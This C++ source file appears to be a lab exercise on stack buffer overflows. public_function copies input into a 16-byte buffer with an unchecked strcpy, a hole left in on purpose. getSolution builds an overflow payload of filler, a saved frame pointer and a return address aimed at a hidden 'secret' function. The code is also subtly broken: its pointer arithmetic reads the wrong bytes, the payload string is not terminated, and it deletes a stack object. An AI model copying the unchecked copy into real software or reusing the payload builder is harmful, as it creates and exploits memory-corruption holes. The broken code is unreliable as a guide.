#ifndef DEBUG
#define DEBUG false
#endif
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <iostream>
#include <string>
#include <sstream>
#define BUFSIZE 16

//

using namespace std;

void public_function(string arg){
	char buffer[BUFSIZE];
	memset(buffer, 'B', BUFSIZE);
	strcpy(buffer, arg.c_str());
}

void secret(void){
	cout << "SECRET TUNNEL" << endl;
	exit(0);
}

string * getSolution(unsigned int addr){
	string input;
	cout << "Input filler to rbp:" << endl;
	getline(cin, input);
	int filler = stoi(input, NULL, 10);
	input = "";
	bool doRBP = true;
	while(true){
		cout << "Do RBP? y/n" << endl;
		getline(cin, input);
		if(input.compare("y")==0)
			break;
		else if (input.compare("n")==0){
			doRBP=false;
			break;
		}
		input = "";
	}
	unsigned long rbp = 0x7fffffffe8b8;
	cout << "Filler length = " << dec << filler << "\nrbp = " << hex << rbp << "\nAddr = " << hex << addr << endl;
	char char_arr[filler+18];
	for(int i=0; i<filler; i++){
		char_arr[i] = 's';
	}
	
	if(doRBP){
		for(int i=filler; i<filler+12; i++){
			char_arr[i] = *((char *) (&rbp + sizeof(char) * (i-filler)));
		}
		for(int i=filler+12; i<filler+14; i++){
			char_arr[i] = (char) 0;
		}
		for(int i=filler+14; i<filler+18; i++){
			char_arr[i] = *((char *) (&addr + sizeof(char) * (i-filler-14)));
		}
	} else {
		for(int i=filler; i<filler+4; i++){
			char_arr[i] = *((char *) (&addr + sizeof(char) * (i-filler)));
		}
	}
	cout << "Generated output string: " << char_arr << endl;
	return new string(char_arr);
}

int main(int argc, char** argv){
#if DEBUG
cout << "BUFSIZE: " << BUFSIZE << endl;
#endif
	int uid;
    uid = getuid();
	if(uid==0)
		secret();
	else{
		string arg;
		cout << "Input \"password\" or \"AUTO:(addr)\"" << endl;
		getline(cin, arg);
		bool delarg = false;
		if(arg.c_str()[0]=='A' && arg.c_str()[1]=='U' && arg.c_str()[2]=='T' && arg.c_str()[3]=='O' && arg.c_str()[4]==':'){
			unsigned int addr = stoi(arg.substr(5, string::npos), NULL, 16);
			cout << "User has input \"AUTO:";
			cout << hex << addr;
			cout << "\"" << endl;
			arg = *getSolution(addr);
			delarg=true;
		}
		cout << "User input: \"" << arg << "\"\nInput.length: " << dec << arg.length() << endl;
		public_function(arg);
		if(delarg){
			delete &arg;
		}
	}
	return 0;
}